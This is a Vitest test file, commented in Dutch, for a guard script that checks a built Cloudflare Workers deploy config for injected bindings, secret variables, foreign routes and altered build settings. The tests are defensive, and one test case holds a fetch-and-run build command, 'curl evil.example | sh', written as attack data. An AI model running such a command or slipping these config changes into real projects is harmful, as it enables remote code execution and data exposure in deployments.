import { spawnSync } from "node:child_process";
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join, resolve } from "node:path";
import { afterEach, beforeEach, describe, expect, it } from "vitest";

/**
 * Aanval: een binding (D1, KV, R2, een andere Worker, secrets) of een geheime variabele in
 * productie krijgen zonder dat er iets rood wordt.
 *
 * `wrangler.jsonc` is niet wat er wordt uitgerold: de build maakt er een nieuwe config van
 * (dist/server/wrangler.json), en via `vite.config.ts` (een bestand van het project) kan daar
 * van alles bij komen. `guard:cloudflare --gebouwd` controleert daarom het gebouwde bestand
 * met dezelfde regels, in de check Code na de build en vlak voor `wrangler deploy`.
 *
 * Deze tests zetten een gebouwde app neer zoals de plugin van Cloudflare hem maakt en
 * veranderen er steeds één ding aan. De echte build staat in tests/unit/gebouwd.test.ts.
 */
const GUARD = resolve(__dirname, "../../scripts/guard-cloudflare.mjs");

let map: string;
beforeEach(() => {
  map = mkdtempSync(join(tmpdir(), "guard-gebouwd-"));
});
afterEach(() => {
  rmSync(map, { recursive: true, force: true });
});

const BRON = {
  name: "cf-proef",
  compatibility_date: "2026-11-10",
  main: "./workers/app.ts",
  observability: { enabled: true },
  workers_dev: true,
  preview_urls: true,
  routes: [{ pattern: "shop.klant.nl", custom_domain: true }],
};

/** De gebouwde config zoals @cloudflare/vite-plugin 1.69 hem schrijft (ingekort waar leeg). */
function gebouwd(): Record<string, unknown> {
  return {
    configPath: join(map, "wrangler.jsonc"),
    userConfigPath: join(map, "wrangler.jsonc"),
    topLevelName: "cf-proef",
    definedEnvironments: [],
    compatibility_date: "2026-11-10",
    compatibility_flags: [],
    jsx_factory: "React.createElement",
    jsx_fragment: "React.Fragment",
    rules: [{ type: "ESModule", globs: ["**/*.js", "**/*.mjs"] }],
    name: "cf-proef",
    main: "index.js",
    triggers: {},
    assets: { directory: "../client" },
    workers_dev: true,
    preview_urls: true,
    routes: [{ pattern: "shop.klant.nl", custom_domain: true }],
    vars: {},
    durable_objects: { bindings: [] },
    workflows: [],
    migrations: [],
    exports: {},
    kv_namespaces: [],
    cloudchamber: {},
    send_email: [],
    queues: { producers: [], consumers: [] },
    r2_buckets: [],
    d1_databases: [],
    vectorize: [],
    hyperdrive: [],
    services: [],
    analytics_engine_datasets: [],
    dispatch_namespaces: [],
    mtls_certificates: [],
    pipelines: [],
    secrets_store_secrets: [],
    logfwdr: { bindings: [] },
    upload_source_maps: true,
    observability: { enabled: true },
    python_modules: { exclude: ["**/*.pyc"] },
    dev: {
      ip: "localhost",
      local_protocol: "http",
      upstream_protocol: "http",
      enable_containers: true,
      generate_types: false,
    },
    no_bundle: true,
  };
}

const HEADERS =
  "# uitleg\nhttps://:versie.:subdomein.workers.dev/*\n  X-Robots-Tag: noindex, nofollow\n";

function zet(bestanden: Record<string, string>) {
  for (const [naam, inhoud] of Object.entries(bestanden)) {
    mkdirSync(dirname(join(map, naam)), { recursive: true });
    writeFileSync(join(map, naam), inhoud);
  }
}

function draai(
  wijzig: (config: Record<string, unknown>) => void = () => {},
  extra: Record<string, string> = {},
  vlaggen = ["--gebouwd"],
) {
  const config = gebouwd();
  wijzig(config);
  zet({
    "wrangler.jsonc": JSON.stringify(BRON),
    "dist/server/wrangler.json": JSON.stringify(config),
    "dist/server/index.js": "export default {};",
    "dist/client/_headers": HEADERS,
    ".wrangler/deploy/config.json": JSON.stringify({
      configPath: "../../dist/server/wrangler.json",
      auxiliaryWorkers: [],
    }),
    ...extra,
  });
  const r = spawnSync("node", [GUARD, ...vlaggen], { cwd: map, encoding: "utf8" });
  return { code: r.status, uitvoer: `${r.stdout}${r.stderr}` };
}

describe("guard:cloudflare --gebouwd: wat de build maakt, is wat er wordt uitgerold", () => {
  it("keurt een gebouwde app goed die klopt met wrangler.jsonc", () => {
    const r = draai();
    expect(r.code, r.uitvoer).toBe(0);
    expect(r.uitvoer).toContain("de gebouwde config ook");
  });

  it("controleert het gebouwde bestand ook zonder vlag, zodra het er is (pnpm check)", () => {
    const r = draai(
      (c) => {
        c.d1_databases = [{ binding: "DB", database_name: "x", database_id: "y" }];
      },
      {},
      [],
    );
    expect(r.code).not.toBe(0);
  });

  it("faalt met --gebouwd als er niets gebouwd is, of als de build ergens anders terechtkwam", () => {
    zet({
      "wrangler.jsonc": JSON.stringify(BRON),
      "build/server/wrangler.json": JSON.stringify(gebouwd()),
    });
    const r = spawnSync("node", [GUARD, "--gebouwd"], { cwd: map, encoding: "utf8" });
    expect(r.status).not.toBe(0);
    expect(`${r.stdout}${r.stderr}`).toContain("dist/server/wrangler.json ontbreekt");
  });
});

describe("aanval: een binding in productie via de build (vite.config.ts)", () => {
  const BINDINGEN: [string, unknown][] = [
    ["d1_databases", [{ binding: "DB", database_name: "x", database_id: "y" }]],
    ["kv_namespaces", [{ binding: "KV", id: "y" }]],
    ["r2_buckets", [{ binding: "BESTANDEN", bucket_name: "x" }]],
    ["durable_objects", { bindings: [{ name: "DO", class_name: "X" }] }],
    ["services", [{ binding: "ANDERE", service: "worker-met-sleutels" }]],
    ["secrets_store_secrets", [{ binding: "S", store_id: "x", secret_name: "service-role" }]],
    ["queues", { producers: [{ binding: "Q", queue: "x" }], consumers: [] }],
    ["hyperdrive", [{ binding: "PG", id: "x" }]],
    ["vectorize", [{ binding: "V", index_name: "x" }]],
    ["analytics_engine_datasets", [{ binding: "A" }]],
    ["dispatch_namespaces", [{ binding: "D", namespace: "x" }]],
    ["mtls_certificates", [{ binding: "C", certificate_id: "x" }]],
    ["send_email", [{ name: "MAIL" }]],
    ["workflows", [{ binding: "W", name: "x", class_name: "X" }]],
    ["pipelines", [{ binding: "P", pipeline: "x" }]],
    ["logfwdr", { bindings: [{ name: "L", destination: "x" }] }],
    ["ai", { binding: "AI" }],
    ["browser", { binding: "BROWSER" }],
    ["images", { binding: "IMAGES" }],
    ["version_metadata", { binding: "VERSIE" }],
    ["unsafe", { bindings: [{ name: "X", type: "secret_text", text: "geheim" }] }],
    ["tail_consumers", [{ service: "afluisteraar" }]],
    ["migrations", [{ tag: "v1", new_sqlite_classes: ["X"] }]],
    ["een_soort_die_cloudflare_volgend_jaar_verzint", [{ binding: "NIEUW" }]],
  ];
  for (const [sleutel, waarde] of BINDINGEN) {
    it(`${sleutel}: rood`, () => {
      const r = draai((c) => {
        c[sleutel] = waarde;
      });
      expect(r.code, r.uitvoer).not.toBe(0);
      expect(r.uitvoer).toContain(`\`${sleutel}\``);
    });
  }

  it("assets met een binding, of bestanden uit een andere map: rood", () => {
    expect(draai((c) => (c.assets = { directory: "../client", binding: "ASSETS" })).code).not.toBe(
      0,
    );
    expect(draai((c) => (c.assets = { directory: "../../geheim" })).code).not.toBe(0);
    expect(
      draai((c) => (c.assets = { directory: "../client", run_worker_first: true })).code,
    ).not.toBe(0);
  });
});

describe("aanval: een geheime variabele in productie via de build", () => {
  it("een variabele die niet op de openbare lijst staat: rood", () => {
    for (const naam of [
      "SUPABASE_SERVICE_ROLE_KEY",
      "API_TOKEN",
      "VITE_GEHEIM",
      "vite_supabase_url",
    ]) {
      const r = draai((c) => (c.vars = { [naam]: "x" }));
      expect(r.code, naam).not.toBe(0);
      expect(r.uitvoer).toContain(`\`vars.${naam}\``);
    }
  });

  it("een openbare naam met een waarde die geen tekst is: rood", () => {
    const r = draai((c) => (c.vars = { VITE_SUPABASE_URL: { geheim: "x" } }));
    expect(r.code).not.toBe(0);
    expect(r.uitvoer).toContain("hoort een tekst te zijn");
  });

  it("keep_vars, een tweede omgeving, of geheimen die verplicht worden gesteld: rood", () => {
    expect(draai((c) => (c.keep_vars = true)).code).not.toBe(0);
    expect(draai((c) => (c.definedEnvironments = ["production"])).code).not.toBe(0);
    expect(draai((c) => (c.secrets = { required: ["SERVICE_ROLE"] })).code).not.toBe(0);
    expect(draai((c) => (c.targetEnvironment = "production")).code).not.toBe(0);
  });

  it("de openbare waarden zelf mogen", () => {
    const r = draai(
      (c) => (c.vars = { VITE_OMGEVING: "test", VITE_SUPABASE_URL: "https://x.supabase.co" }),
    );
    expect(r.code, r.uitvoer).toBe(0);
  });
});

describe("aanval: een andere Worker, een ander adres of andere code uitrollen dan wrangler.jsonc zegt", () => {
  const ANDERS: [string, (c: Record<string, unknown>) => void][] = [
    ["een andere naam", (c) => (c.name = "worker-van-een-ander")],
    ["een andere topLevelName", (c) => (c.topLevelName = "worker-van-een-ander")],
    ["een ander beginbestand", (c) => (c.main = "../../eigen-worker.js")],
    [
      "een extra route",
      (c) =>
        (c.routes = [
          { pattern: "shop.klant.nl", custom_domain: true },
          { pattern: "open.klant.nl", custom_domain: true },
        ]),
    ],
    ["een andere route", (c) => (c.routes = [{ pattern: "evil.example", custom_domain: true }])],
    ["een zone-route erbij", (c) => (c.route = { pattern: "klant.nl/*", zone_name: "klant.nl" })],
    ["workers_dev uit", (c) => (c.workers_dev = false)],
    ["opnieuw bundelen", (c) => (c.no_bundle = false)],
    ["een andere datum", (c) => (c.compatibility_date = "2020-01-01")],
    ["een extra instelling van de omgeving", (c) => (c.compatibility_flags = ["nodejs_compat"])],
    [
      "logregels naar elders",
      (c) =>
        (c.observability = { enabled: true, logs: { destinations: ["https://logs.example"] } }),
    ],
    ["taken op een tijdstip", (c) => (c.triggers = { crons: ["* * * * *"] })],
    ["een bouwstap van buiten", (c) => (c.build = { command: "curl evil.example | sh" })],
    ["tekst inlezen als module", (c) => (c.rules = [{ type: "Text", globs: ["**/*.txt"] }])],
    [
      "een andere wrangler.jsonc als bron",
      (c) => (c.userConfigPath = "/tmp/andere/wrangler.jsonc"),
    ],
    ["logpush", (c) => (c.logpush = true)],
    ["een eigen plek in het netwerk", (c) => (c.placement = { mode: "smart" })],
    ["tekst vervangen in de code", (c) => (c.define = { "process.env.X": '"geheim"' })],
  ];
  for (const [naam, wijzig] of ANDERS) {
    it(`${naam}: rood`, () => {
      const r = draai(wijzig);
      expect(r.code, r.uitvoer).not.toBe(0);
    });
  }

  it("de doorverwijzing van wrangler wijst naar een ander bestand: rood", () => {
    const r = draai(() => {}, {
      ".wrangler/deploy/config.json": JSON.stringify({
        configPath: "../../elders/wrangler.json",
        auxiliaryWorkers: [],
      }),
      "elders/wrangler.json": JSON.stringify({
        name: "cf-proef",
        d1_databases: [{ binding: "DB" }],
      }),
    });
    expect(r.code).not.toBe(0);
    expect(r.uitvoer).toContain(".wrangler/deploy/config.json");
  });

  it("de doorverwijzing noemt een tweede Worker: rood", () => {
    const r = draai(() => {}, {
      ".wrangler/deploy/config.json": JSON.stringify({
        configPath: "../../dist/server/wrangler.json",
        auxiliaryWorkers: [{ configPath: "../../dist/tweede/wrangler.json" }],
      }),
    });
    expect(r.code).not.toBe(0);
  });

  it("een wrangler.json of wrangler.toml naast wrangler.jsonc: rood", () => {
    for (const naam of ["wrangler.json", "wrangler.toml"]) {
      const r = draai(() => {}, { [naam]: naam.endsWith("toml") ? 'name = "x"\n' : "{}" });
      expect(r.code, naam).not.toBe(0);
      expect(r.uitvoer).toContain(naam);
      rmSync(join(map, naam));
    }
  });

  it("de uitrol krijgt precies het gecontroleerde bestand mee, na de controle", async () => {
    const { readFileSync } = await import("node:fs");
    const { parse } = await import("yaml");
    const uitrol = parse(
      readFileSync(resolve(__dirname, "../../.github/workflows/uitrollen.yml"), "utf8"),
    ) as {
      jobs: { productie: { steps: { name?: string; run?: string }[] } };
    };
    const stappen = uitrol.jobs.productie.steps;
    const bouwen = stappen.findIndex((s) => s.run === "pnpm build");
    const controle = stappen.findIndex((s) => s.run?.includes("guard-cloudflare.mjs --gebouwd"));
    const deploy = stappen.findIndex((s) => s.run?.includes("wrangler deploy"));
    expect(bouwen).toBeGreaterThan(-1);
    expect(controle).toBeGreaterThan(bouwen);
    expect(deploy).toBe(controle + 1);
    expect(stappen[controle]?.run).toContain("guard-secrets.mjs");
    expect(stappen[controle]?.run).toContain("guard-server.mjs");
    expect(stappen[deploy]?.run).toBe("pnpm exec wrangler deploy -c dist/server/wrangler.json");
    // Geen enkele stap die wrangler aanroept, doet dat zonder de gecontroleerde config.
    for (const stap of stappen.filter((s) => s.run?.includes("wrangler "))) {
      expect(stap.run).toContain("-c dist/server/wrangler.json");
    }
  });
});

describe("aanval: om de servercode heen een pagina of een regel voor zoekmachines neerzetten", () => {
  for (const [naam, pad] of [
    ["een vast robots.txt uit public/", "dist/client/robots.txt"],
    ["een kant-en-klare pagina uit public/", "dist/client/actie.html"],
    ["een index.html", "dist/client/index.html"],
    ["een vooraf gemaakte pagina (prerender)", "dist/client/product/tuinstoel/index.html"],
    ["vooraf gemaakte gegevens (prerender)", "dist/client/product/tuinstoel.data"],
    ["een bestand met omleidingen", "dist/client/_redirects"],
  ] as [string, string][]) {
    it(`${naam}: rood`, () => {
      const r = draai(() => {}, { [pad]: "User-agent: *\nAllow: /\n" });
      expect(r.code, r.uitvoer).not.toBe(0);
      expect(r.uitvoer).toContain(pad);
    });
  }

  it("_headers zonder de regel voor workers.dev, of met een extra regel: rood", () => {
    for (const inhoud of [
      "",
      "/*\n  X-Robots-Tag: all\n",
      `${HEADERS}/*\n  ! X-Robots-Tag\n`,
      `${HEADERS}https://:a.:b.workers.dev/*\n  ! X-Robots-Tag\n`,
      HEADERS.replace("noindex, nofollow", "all"),
      `${HEADERS}/*\n  Cache-Control: public, max-age=31536000\n`,
    ]) {
      const r = draai(() => {}, { "dist/client/_headers": inhoud });
      expect(r.code, JSON.stringify(inhoud)).not.toBe(0);
      expect(r.uitvoer).toContain("_headers");
    }
  });

  it("public/_headers van deze repo is precies de regel die de guard eist", async () => {
    const { readFileSync } = await import("node:fs");
    const r = draai(() => {}, {
      "dist/client/_headers": readFileSync(resolve(__dirname, "../../public/_headers"), "utf8"),
    });
    expect(r.code, r.uitvoer).toBe(0);
  });
});

describe("de config van een preview krijgt dezelfde controle", () => {
  it("een wrangler.jsonc met een binding levert geen preview-config op", async () => {
    const { pathToFileURL } = await import("node:url");
    const lib = (await import(
      pathToFileURL(resolve(__dirname, "../../scripts/lib/cloudflare-config.mjs")).href
    )) as {
      previewConfig: (c: object, p: { worker: string; assets: string }) => Record<string, unknown>;
      gebouwdFouten: (c: object, b: object, v: object) => string[];
    };
    const paden = { worker: "/tmp/dist/server/index.js", assets: "/tmp/dist/client" };
    const goed = lib.previewConfig(BRON, paden);
    expect(goed.routes).toBeUndefined();
    expect(() => lib.previewConfig({ ...BRON, vars: { GEHEIM: "x" } }, paden)).toThrow(
      /vars\.GEHEIM/,
    );
    // En wie de preview-config na het maken nog aanpast, valt door dezelfde mand.
    const verwacht = {
      main: paden.worker,
      assets: paden.assets,
      routes: [],
      losseModules: true,
      configPad: undefined,
    };
    expect(lib.gebouwdFouten(goed, BRON, verwacht)).toEqual([]);
    expect(
      lib.gebouwdFouten({ ...goed, kv_namespaces: [{ binding: "X" }] }, BRON, verwacht),
    ).not.toEqual([]);
    expect(
      lib.gebouwdFouten(
        { ...goed, routes: [{ pattern: "shop.klant.nl", custom_domain: true }] },
        BRON,
        verwacht,
      ),
    ).not.toEqual([]);
  });
});
